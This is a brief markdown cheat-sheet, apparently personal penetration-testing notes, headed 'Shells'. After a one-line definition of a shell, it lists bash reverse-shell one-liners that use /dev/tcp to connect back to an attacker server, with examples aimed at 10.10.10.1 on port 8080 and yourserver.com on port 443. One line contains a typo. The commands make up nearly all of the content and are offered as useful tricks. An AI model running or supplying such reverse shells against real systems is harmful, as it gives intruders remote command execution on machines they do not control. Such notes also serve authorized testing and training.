# Shells

>  A shell is software/protocol that provides an interface for an CLI to the underlying OS


### BASH

Bash as it stands, is a (the most popular) shell on its own, but can also provide some really neat tricks to allow for all kinds of shell related goodness, such as a reverse shell.

#### Bash reverse shell

* Spawn a reverse shell back to your server using /dev/tcp 
    > bash -i >& /dev/tcp/<yourserver>/8080 0>&1 - e.g  bash -i >& /dev/tcp/10.10.10.1/8080 0>&1
    > or bassh -c bash -i >& /dev/tcp/<yourserver>/8080 0>&1 or e.g $ bash -i >& /dev/tcp/yourserver.com/443 0>&1
